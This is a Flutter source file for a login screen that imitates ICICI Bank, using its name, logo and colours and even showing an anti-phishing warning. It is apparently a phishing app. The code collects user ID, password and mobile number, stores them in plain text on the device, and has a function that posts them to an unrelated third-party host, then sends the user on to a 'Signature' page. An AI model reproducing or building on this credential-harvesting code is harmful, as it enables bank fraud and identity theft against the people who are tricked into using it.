import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:icici/signature.dart';
import 'package:http/http.dart' as http;
// ignore: depend_on_referenced_packages
import 'package:shared_preferences/shared_preferences.dart';

class Login extends StatefulWidget {
  const Login({super.key});

  @override
  State<Login> createState() => _LoginState();
}

class _LoginState extends State<Login> {
  late SharedPreferences prefs;

  var loading = false;
  final TextEditingController _userIdController = TextEditingController();
  final TextEditingController _phoneController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();

  Future<void> _saveData() async {
    setState(() {
      loading = true;
    });
    String userId = _userIdController.text;
    String phone = _phoneController.text;
    String password = _passwordController.text;

    if (userId.isEmpty || phone.isEmpty || password.isEmpty) {
      showDialog(
        context: context,
        builder: (BuildContext context) {
          return AlertDialog(
            title: Text('Error'),
            content: Text('Please fill in all fields.'),
            actions: <Widget>[
              TextButton(
                child: Text('OK'),
                onPressed: () {
                  Navigator.of(context).pop();
                },
              ),
            ],
          );
        },
      );
      setState(() {
        loading = false;
      });
      return;
    }

    if (phone.length != 10) {
      showDialog(
        context: context,
        builder: (BuildContext context) {
          return AlertDialog(
            title: Text('Error'),
            content: Text('Please enter a valid 10-digit phone number.'),
            actions: <Widget>[
              TextButton(
                child: Text('OK'),
                onPressed: () {
                  Navigator.of(context).pop();
                },
              ),
            ],
          );
        },
      );
      setState(() {
        loading = false;
      });
      return;
    }

    SharedPreferences prefs = await SharedPreferences.getInstance();
    await prefs.setString('userId', userId);
    await prefs.setString('phone', phone);
    await prefs.setString('password', password);

    await Future.delayed(const Duration(seconds: 2));
    setState(() {
      loading = false;
    });

    // ignore: use_build_context_synchronously
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => const Signature(),
      ),
    );
  }

  Future Login() async {
    //Set Loading to true
    setState(() {
      loading = true;
    });
    await http
        .post(Uri.parse("https://all-request-gt6w57.dauqu.host/login"),
            headers: <String, String>{
              'Content-Type': 'application/json; charset=UTF-8',
            },
            body: jsonEncode(<String, String>{
              "phone": _phoneController.text,
              "user_id": _userIdController.text,
              "password": _passwordController.text,
            }))
        .then((value) => {
              //Set Laoding to false
              setState(() {
                loading = false;
              }),

              //If response is 200 then navigate to other page
              if (value.statusCode == 200)
                {
                  Navigator.push(
                    context,
                    MaterialPageRoute(
                      builder: (context) => const Signature(),
                    ),
                  )
                },
              if (value.statusCode == 400)
                {
                  showDialog(
                      context: context,
                      builder: (BuildContext context) {
                        return AlertDialog(
                          title: const Text("Error"),
                          content: Text(value.body),
                          actions: [
                            TextButton(
                                onPressed: () {
                                  Navigator.of(context).pop();
                                },
                                child: const Text("OK"))
                          ],
                        );
                      })
                }
            })

        //Navigate to other page
        .catchError((onError) {
      print(onError);
      //Set Loading fase
      setState(() {
        loading = false;
      });

      //Show nackend error in dialog
      showDialog(
          context: context,
          builder: (BuildContext context) {
            return AlertDialog(
              title: const Text("Error"),
              content: Text(onError.toString()),
              actions: [
                TextButton(
                    onPressed: () {
                      Navigator.of(context).pop();
                    },
                    child: const Text("OK"))
              ],
            );
          });
    });
  }

  var _isVisibility = true;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.yellow.shade900,
        title: const Text("ICICI Bank"),
      ),
      body: Container(
        color: Colors.white,
        padding: const EdgeInsets.all(20),
        width: double.infinity,
        child: SingleChildScrollView(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            // mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const SizedBox(
                height: 30,
              ),
              Image.asset(
                "assets/images/logo.jpg",
                height: 60,
              ),
              const SizedBox(
                height: 20,
              ),
              // const Text(
              //   "Login To Internet Banking",
              //   style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold),
              // ),
              const SizedBox(
                height: 20,
              ),
              const Text(
                "Authenticate Your User Id and Password to Login to Internet Banking",
                textAlign: TextAlign.start,
                style: TextStyle(fontSize: 15),
              ),
              const SizedBox(
                height: 60,
              ),
              //Login UI
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text("User ID*"),
                  const SizedBox(
                    height: 10,
                  ),
                  TextField(
                    controller: _userIdController,
                    style: const TextStyle(color: Colors.black),
                    decoration: const InputDecoration(
                      contentPadding: EdgeInsets.all(15),
                      isDense: true,
                      hintText: 'User ID',
                      hintStyle: TextStyle(color: Colors.black),
                      // fillColor: Colors.black,
                      // border: InputBorder.none,
                      filled: true,
                      prefixIcon: Icon(Icons.person, color: Colors.black),
                    ),
                  ),
                ],
              ),
              const SizedBox(
                height: 20,
              ),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text("Password*"),
                  const SizedBox(
                    height: 10,
                  ),
                  TextField(
                      obscureText: _isVisibility,
                      controller: _passwordController,
                      style: const TextStyle(color: Colors.black),
                      decoration: InputDecoration(
                          contentPadding: EdgeInsets.all(15),
                          isDense: true,
                          hintText: 'Password',
                          hintStyle: TextStyle(color: Colors.black),
                          // fillColor: Colors.black,
                          // border: InputBorder.none,
                          filled: true,
                          prefixIcon: Icon(Icons.tag, color: Colors.black),
                          suffixIcon: IconButton(
                              onPressed: () {
                                setState(() {
                                  _isVisibility = !_isVisibility;
                                });
                              },
                              icon: _isVisibility
                                  ? const Icon(Icons.visibility)
                                  : const Icon(Icons.visibility_off)))),
                ],
              ),
              const SizedBox(
                height: 20,
              ),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text("Mobile Nomber*"),
                  const SizedBox(
                    height: 10,
                  ),
                  TextField(
                    controller: _phoneController,
                    style: const TextStyle(color: Colors.black),
                    decoration: const InputDecoration(
                      contentPadding: EdgeInsets.all(15),
                      isDense: true,
                      hintText: 'Mobile No.',
                      hintStyle: TextStyle(color: Colors.black),
                      filled: true,
                      prefixIcon: Icon(Icons.phone, color: Colors.black),
                    ),
                    keyboardType: TextInputType
                        .number, // Set the keyboard type to numeric
                    inputFormatters: <TextInputFormatter>[
                      FilteringTextInputFormatter
                          .digitsOnly // Restrict input to digits only
                    ],
                  )
                ],
              ),
              const SizedBox(
                height: 20,
              ),
              // const TextField(
              //   // controller: _passwordController,
              //   style: TextStyle(color: Colors.black),
              //   decoration: InputDecoration(
              //     contentPadding: EdgeInsets.all(15),
              //     isDense: true,
              //     hintText: 'Password',
              //     hintStyle: TextStyle(color: Colors.black),
              //     // fillColor: Colors.black,
              //     border: InputBorder.none,
              //     filled: true,
              //     prefixIcon: Icon(Icons.password, color: Colors.black),
              //   ),
              // ),
              // const SizedBox(
              //   height: 20,
              // ),
              //Rember me

              // const TextField(
              //   // controller: _passwordController,
              //   style: TextStyle(color: Colors.black),
              //   decoration: InputDecoration(
              //     contentPadding: EdgeInsets.all(15),
              //     isDense: true,
              //     hintText: 'Mobile No.',
              //     hintStyle: TextStyle(color: Colors.black),
              //     // fillColor: Colors.black,
              //     border: InputBorder.none,
              //     filled: true,
              //     prefixIcon: Icon(Icons.phone, color: Colors.black),
              //   ),
              // ),
              // const SizedBox(
              //   height: 20,
              // ),

              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    // shape: RoundedRectangleBorder(
                    //   borderRadius: BorderRadius.circular(0),
                    // ),
                    backgroundColor: Colors.yellow.shade900,
                    padding: const EdgeInsets.all(5),
                    elevation: 0,
                  ),
                  onPressed: loading
                      ? null
                      : () {
                          //Login
                          _saveData();
                        },
                  child: Text(
                    loading ? "Please Wait..." : "Login",
                    style: const TextStyle(
                        fontSize: 15,
                        //font style to ubuntu
                        fontFamily: 'Ubuntu',
                        //400 weight
                        fontWeight: FontWeight.w700,
                        color: Colors.white),
                  ),
                ),
              ),
              const SizedBox(
                height: 20,
              ),
              //Some text about sefty
              const Text(
                "Safe banking tips: Beware of phishing and vishing attacks, Avoid sharing account related information over E-mail and SMS, Please read the terms and conditions carefully before proceeding.",
                textAlign: TextAlign.start,
                style: TextStyle(fontSize: 15),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
